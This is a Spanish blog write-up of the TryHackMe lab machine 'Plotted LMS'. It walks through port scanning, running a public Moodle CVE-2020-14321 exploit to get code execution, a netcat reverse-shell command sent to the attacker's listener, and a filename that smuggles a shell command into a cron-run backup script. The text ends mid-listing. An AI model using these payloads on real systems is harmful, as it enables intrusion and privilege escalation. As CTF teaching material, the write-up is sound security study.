<!doctype html><html lang=es><head><title>Plotted LMS - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Difícil sa.infinity8888    Reconocimiento ¡Hola, bienvenido de nuevo a mi blog! ¡Hoy estamos jugando con una máquina de nivel Difícil creada por el creador de la serie &amp;ldquo;Plotted&amp;rdquo; sa.infinity8888!
¡Empecemos a enumerar!
╰─ map 10.10.210.16 ─╯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 11:50 CEST Nmap scan report for 10.10.210.16 Host is up (0.11s latency). Not shown: 65530 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/plotted-lms/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/plotted-lms/cover.jpeg"><meta name=twitter:title content="Plotted LMS - Write Up - Español"><meta name=twitter:description content="Máquina de nivel difícil en TryHackMe."><meta property="og:title" content="Plotted LMS - Write Up - Español"><meta property="og:description" content="Máquina de nivel difícil en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/plotted-lms/"><meta property="og:image" content="/es/posts/plotted-lms/cover.jpeg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-24T17:17:40+02:00"><meta property="article:modified_time" content="2022-04-24T17:17:40+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span></a>
<span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>Plotted LMS - Write Up - Español</h1><div class=post-meta><span class=post-date>2022-04-24</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 12 mins lectura</span></div><span class=post-tags><a href=/tags/enumeration/>#Enumeration</a>&nbsp;
<a href=/tags/cronjobs/>#cronjobs</a>&nbsp;
<a href=/tags/code-injection/>#Code-Injection</a>&nbsp;
<a href=/tags/logrotten/>#logrotten</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/plotted-lms/cover.jpeg alt="Plotted LMS - Write Up - Español"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li><li><a href=#posibles-agujeros-de-conejos-misc>Posibles agujeros de conejos (MISC)</a><ul><li><a href=#rails>Rails</a></li><li><a href=#general-404403503-errors>General 404/403/503 errors</a></li><li><a href=#priv-escalation-a-root>Priv Escalation a root</a></li></ul></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/plottedlms>Aquí</a></td><td>Difícil</td><td><a href=https://tryhackme.com/p/sa.infinity8888>sa.infinity8888</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>¡Hola, bienvenido de nuevo a mi blog! ¡Hoy estamos jugando con una máquina de nivel Difícil creada por el creador de la serie &ldquo;Plotted&rdquo; <a href=https://tryhackme.com/p/sa.infinity8888>sa.infinity8888</a>!</p><p>¡Empecemos a enumerar!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ map  10.10.210.16                                                                             ─╯
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-04-23 11:50 CEST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.210.16
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.11s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65530</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 67:af:92:c1:f0:9f:8a:18:62:8d:bf:ba:c4:58:8d:52 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 03:ca:42:df:ef:4b:3e:e6:91:0e:b2:bc:b4:42:1e:d1 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> f1:ed:8a:8d:e4:87:d8:c7:69:c1:ca:2b:a4:dc:0c:dc <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style=display:flex><span>873/tcp  open  http    Apache httpd 2.4.52 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Debian Default Page: It works
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.52 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>8820/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style=display:flex><span>9020/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 45.95 seconds
</span></span></code></pre></div><p>Enumeramos todos los puertos web y servicios que se ejecutan en la máquina. En resumen, esto es lo que encontramos:</p><table><thead><tr><th>Puerto</th><th>Servicio</th><th>Plataforma</th></tr></thead><tbody><tr><td>80</td><td>Apache</td><td>N/A</td></tr><tr><td>873</td><td>Apache</td><td>Online Railway Reservation System V.1.0</td></tr><tr><td>8820</td><td>Apache</td><td>Learning Managment System V.??</td></tr><tr><td>9020</td><td>Apache</td><td>Moodle V.3.9.0-beta</td></tr></tbody></table><p>Los puertos <code>873/8820</code> tenían algunas vulnerabilidades comunes, pero el creador las arregló, cuando intentabas explotar cualquier cosa, obtenías algo como &ldquo;¡Confía en mí, no es tan fácil!&rdquo;(&ldquo;Trust me, it is not this easy!!!&rdquo;)</p><p>Así que escaneamos el puerto <code>9020</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ python3 moodlescan.py -u http://10.10.220.166:9020/moodle/                                                                          ─╯
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> .S_SsS_S.     sSSs_sSSs      sSSs_sSSs     .S_sSSs    S.        sSSs    sSSs    sSSs   .S_SSSs     .S_sSSs
</span></span><span style=display:flex><span>.SS~S*S~SS.   d%%SP~YS%%b    d%%SP~YS%%b   .SS~YS%%b   SS.      d%%SP   d%%SP   d%%SP  .SS~SSSSS   .SS~YS%%b
</span></span><span style=display:flex><span>S%S <span style=color:#e6db74>`</span>Y<span style=color:#e6db74>&#39; S%S  d%S&#39;</span>     <span style=color:#e6db74>`</span>S%b  d%S<span style=color:#e6db74>&#39;     `S%b  S%S   `S%b  S%S     d%S&#39;</span>    d%S<span style=color:#e6db74>&#39;    d%S&#39;</span>    S%S   SSSS  S%S   <span style=color:#e6db74>`</span>S%b
</span></span><span style=display:flex><span>S%S     S%S  S%S       S%S  S%S       S%S  S%S    S%S  S%S     S%S     S%|     S%S     S%S    S%S  S%S    S%S
</span></span><span style=display:flex><span>S%S     S%S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S%S    S&amp;S  S&amp;S     S&amp;S     S&amp;S     S&amp;S     S%S SSSS%S  S%S    S&amp;S
</span></span><span style=display:flex><span>S&amp;S     S&amp;S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S&amp;S    S&amp;S  S&amp;S     S&amp;S_Ss  Y&amp;Ss    S&amp;S     S&amp;S  SSS%S  S&amp;S    S&amp;S
</span></span><span style=display:flex><span>S&amp;S     S&amp;S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S&amp;S    S&amp;S  S&amp;S     S&amp;S~SP  <span style=color:#e6db74>`</span>S<span style=color:#f92672>&amp;&amp;</span>S   S&amp;S     S&amp;S    S&amp;S  S&amp;S    S&amp;S
</span></span><span style=display:flex><span>S&amp;S     S&amp;S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S&amp;S    S&amp;S  S&amp;S     S&amp;S       <span style=color:#e6db74>`</span>S*S  S&amp;S     S&amp;S    S&amp;S  S&amp;S    S&amp;S
</span></span><span style=display:flex><span>S*S     S*S  S*b       d*S  S*b       d*S  S*S    d*S  S*b     S*b        l*S  S*b     S*S    S&amp;S  S*S    S*S
</span></span><span style=display:flex><span>S*S     S*S  S*S.     .S*S  S*S.     .S*S  S*S   .S*S  S*S.    S*S.      .S*P  S*S.    S*S    S*S  S*S    S*S
</span></span><span style=display:flex><span>S*S     S*S   SSSbs_sdSSS    SSSbs_sdSSS   S*S_sdSSS    SSSbs   SSSbs  sSS*S    SSSbs  S*S    S*S  S*S    S*S
</span></span><span style=display:flex><span>SSS     S*S    YSSP~YSSY      YSSP~YSSY    SSS~YSSY      YSSP    YSSP  YSS<span style=color:#960050;background-color:#1e0010>&#39;</span>      YSSP  SSS    S*S  S*S    SSS
</span></span><span style=display:flex><span>        SP                                                                                    SP   SP
</span></span><span style=display:flex><span>        Y                                                                                     Y    Y
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version 0.8 - May/2021
</span></span><span style=display:flex><span>.............................................................................................................
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>By Victor Herrera - supported by www.incode.cl
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.............................................................................................................
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Getting server information http://10.10.220.166:9020/moodle/ ...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server          : Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>x-frame-options : sameorigin
</span></span><span style=display:flex><span>last-modified   : Mon, <span style=color:#ae81ff>25</span> Apr <span style=color:#ae81ff>2022</span> 13:50:09 GMT
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Getting moodle version...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Searching vulnerabilities...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Vulnerabilities found: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Scan completed.
</span></span></code></pre></div><p>El escaneo no nos dio nada, era una plataforma <code>Moodle</code> normal, así que comenzamos la fase de reconocimiento con una cuenta creada por nosotros mismos. Y encontramos un curso con el nombre &ldquo;&ndash;Solo profesores&ndash;&rdquo;("&ndash;Teachers Only&ndash;") y una Autoinscripción con el rol de Profesor dentro de ese curso. Era extraño, así que una búsqueda rápida en Google nos dio el siguiente paso.</p><p><img src=teacher_role.png alt=teacher_role></p><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Descubrimos que para <code>Moodle versión 3.9</code> hay un exploit RCE si tiene el rol de Profesor. (CVE-2020-14321).</p><p>¡Y teníamos ese rol!</p><p>Así que descargamos el exploit desde <a href=https://github.com/HoangKien1020/CVE-2020-14321>aquí</a> y lo ejecutamos contra la máquina.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ python3 exploit_mo.py -url http://10.10.93.142:9020/moodle/ -cookie<span style=color:#f92672>=</span>darsatmvtl2kanukccuur10den -cmd<span style=color:#f92672>=</span>ls                                                                                                ─╯
</span></span><span style=display:flex><span>                           ***CVE <span style=color:#ae81ff>2020</span> 14321***
</span></span><span style=display:flex><span>    How to use this PoC script
</span></span><span style=display:flex><span>    Case 1. If you have vaid credentials:
</span></span><span style=display:flex><span>    python3 cve202014321.py -u http://test.local:8080 -u teacher -p <span style=color:#ae81ff>1234</span> -cmd<span style=color:#f92672>=</span>dir
</span></span><span style=display:flex><span>    Case 2. If you have valid cookie:
</span></span><span style=display:flex><span>    python3 cve202014321.py -u http://test.local:8080 -cookie<span style=color:#f92672>=</span>37ov37abn9kv22gj7enred9bl7 -cmd<span style=color:#f92672>=</span>dir
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Your target: http://10.10.93.142:9020/moodle/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Logging in to teacher
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Teacher logins successfully!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Privilege Escalation To Manager in the course Done!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Maybe RCE via install plugins!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Checking RCE ...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> RCE link in here:
</span></span><span style=display:flex><span>http://10.10.93.142:9020/moodle//blocks/rce/lang/en/block_rce.php?cmd<span style=color:#f92672>=</span>ls
</span></span><span style=display:flex><span>block_rce.php
</span></span></code></pre></div><p>¡Sí! ¡Ya tenemos RCE! Entonces unimos una capa inversa.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>========</span> Terminal 1 <span style=color:#f92672>=========</span>
</span></span><span style=display:flex><span>╰─ curl -v http://10.10.169.13:9020/moodle/blocks/rce/lang/en/block_rce.php<span style=color:#ae81ff>\?</span>cmd<span style=color:#ae81ff>\=</span>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.9.0.241%201337%20%3E%2Ftmp%2Ff
</span></span><span style=display:flex><span>*   Trying 10.10.169.13:9020...
</span></span><span style=display:flex><span>* Connected to 10.10.169.13 <span style=color:#f92672>(</span>10.10.169.13<span style=color:#f92672>)</span> port <span style=color:#ae81ff>9020</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
</span></span><span style=display:flex><span>&gt; GET /moodle/blocks/rce/lang/en/block_rce.php?cmd<span style=color:#f92672>=</span>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.9.0.241%201337%20%3E%2Ftmp%2Ff HTTP/1.1
</span></span><span style=display:flex><span>&gt; Host: 10.10.169.13:9020
</span></span><span style=display:flex><span>&gt; User-Agent: curl/7.74.0
</span></span><span style=display:flex><span>&gt; Accept: */*
</span></span><span style=display:flex><span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>========</span> Terminal 2 <span style=color:#f92672>=========</span>
</span></span><span style=display:flex><span>╰─ nc -nlvp <span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.0.241<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.169.13<span style=color:#f92672>]</span> <span style=color:#ae81ff>35964</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>748<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$
</span></span></code></pre></div><p>Pero no podemos leer la flag del usuario&mldr;</p><p>Entonces, ¡escaneemos la máquina nuevamente para escalar nuestros privilegios al usuario <code>plot_admin</code>!</p><p>Encontramos un script de copia de seguridad en el directorio <code>home</code> del usuario&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$ cat /home/plot_admin/backup.py
</span></span><span style=display:flex><span>import os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>moodle_location <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/var/www/uploadedfiles/filedir/&#34;</span>
</span></span><span style=display:flex><span>backup_location <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/home/plot_admin/.moodle_backup/&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>os.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/usr/bin/rm -rf &#34;</span> + backup_location + <span style=color:#e6db74>&#34;*&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>root,dirs,files<span style=color:#f92672>)</span> in os.walk<span style=color:#f92672>(</span>moodle_location<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> file in files:
</span></span><span style=display:flex><span>        os.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/usr/bin/cp &#34;&#39;</span> + root + <span style=color:#e6db74>&#39;/&#39;</span> + file + <span style=color:#e6db74>&#39;&#34; &#39;</span> + backup_location<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>No es un script muy seguro, pero no podemos hacer nada con él, a menos que tengamos un <code>cronjob</code> ejecutándolo&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@plotted-lms:/var/www/9020/moodle/blocks/rce/lang/en$ cat /etc/crontab
</span></span><span style=display:flex><span><span style=color:#75715e># /etc/crontab: system-wide crontab</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># command to install the new version when you edit this file</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and files in /etc/cron.d. These files also have username fields,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># that none of the other crontabs do.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SHELL<span style=color:#f92672>=</span>/bin/sh
</span></span><span style=display:flex><span>PATH<span style=color:#f92672>=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Example of job definition:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># .---------------- minute (0 - 59)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  .------------- hour (0 - 23)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  .---------- day of month (1 - 31)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
</span></span><span style=display:flex><span><span style=color:#75715e># |  |  |  |  |</span>
</span></span><span style=display:flex><span><span style=color:#75715e># *  *  *  *  * user-name command to be executed</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span> *    * * *   root    cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.hourly
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span> <span style=color:#ae81ff>6</span>    * * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.daily <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>* * * * *   plot_admin /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span><span style=color:#ae81ff>47</span> <span style=color:#ae81ff>6</span>    * * <span style=color:#ae81ff>7</span>   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>52</span> <span style=color:#ae81ff>6</span>    <span style=color:#ae81ff>1</span> * *   root    test -x /usr/sbin/anacron <span style=color:#f92672>||</span> <span style=color:#f92672>(</span> cd / <span style=color:#f92672>&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>* * * * *   root    /usr/bin/rsync /var/log/apache2/m*_access /home/plot_admin/.logs_backup/<span style=color:#66d9ef>$(</span>/bin/date +%m.%d.%Y<span style=color:#66d9ef>)</span>; /usr/bin/chown -R plot_admin:plot_admin /home/plot_admin/.logs_backup/<span style=color:#66d9ef>$(</span>/bin/date +%m.%d.%Y<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span></code></pre></div><p>¡¡Y hay un <code>cronjob</code> ejecutándolo con el usuario <code>plot_admin</code>!!</p><p>Entonces, si revisamos el script <code>backup.py</code>, hay 2 variables:</p><p><code>moodle_location</code> y <code>backup_location</code></p><p>¡Tenemos permisos de escritura sobre la <code>ruta</code> a la que apunta la variable <code>moodle_location</code>!</p><p>¡Y dado que esa variable no se está sanitizando, podemos inyectar código malicioso y se ejecutará ya que el script está usando la función <code>os.system</code>!</p><p>Así que básicamente creamos un archivo con el nombre <code>"|chmod -R 777 .|"</code> ¿qué hará este nombre de archivo? Romperá el código y, dado que tenemos el carácter de barra vertical (pipe) [|], en Linux se usa para ejecutar otro comando después del actual. ¡Otorgamos permiso <code>L-E-X</code> a todos para el directorio <code>home</code> del usuario <code>plot_admin</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@plotted-lms://var/www/uploadedfiles/filedir$ ls -la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>44</span>
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> www-data www-data    <span style=color:#ae81ff>5</span> Apr <span style=color:#ae81ff>24</span> 09:30 <span style=color:#e6db74>&#39;&#34;|chmod -R 777 .|&#34;&#39;</span>
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>9</span> www-data www-data <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>24</span> 09:30  .
</span></span><span style=display:flex><span>drwxrwxrwx <span style=color:#ae81ff>10</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  ..
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  0c
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  5f
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  <span style=color:#ae81ff>75</span>
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  8c
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>24</span> 09:27  bf
